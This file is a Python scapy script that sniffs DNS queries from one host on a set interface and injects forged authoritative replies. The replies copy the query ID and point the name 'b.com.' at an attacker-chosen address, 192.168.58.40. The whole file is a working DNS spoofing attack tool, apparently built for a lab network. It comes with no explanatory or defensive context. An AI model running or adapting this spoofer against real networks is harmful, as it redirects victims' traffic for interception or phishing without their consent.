#!/usr/bin/env python

# Import scapy libraries
from scapy.all import *

# Set the interface to listen and respond on
net_interface = "enp0s8"

# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0",       # DNS queries only
    "src host 192.168.56.1"    # IP source <ip>
    ])

# Function that replies to DNS query
def dns_reply(packet):
    resname ="8jaberxyz3com0"
    resbyte = resname.encode('utf-8') 
    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src="0a:08:00:27:ab:26:68",
        dst="0a:00:27:00:00:00"
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    # Construct the DNS response by looking at the sniffed packet and manually
    dns = DNS(
        id=packet[DNS].id,
        qd= DNSQR(qname= packet[DNS].qd.qname,qtype=packet[DNS].qd.qtype,qclass=packet[DNS].qd.qclass),
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname = b'b.com.',
            type='A',
            ttl=600,
            rdata='192.168.58.40')
        )
    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    sendp(response_packet, iface=net_interface)

# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
for i in range(3):
    sniff(filter=packet_filter, prn=dns_reply, store=0, iface=net_interface, count=1)
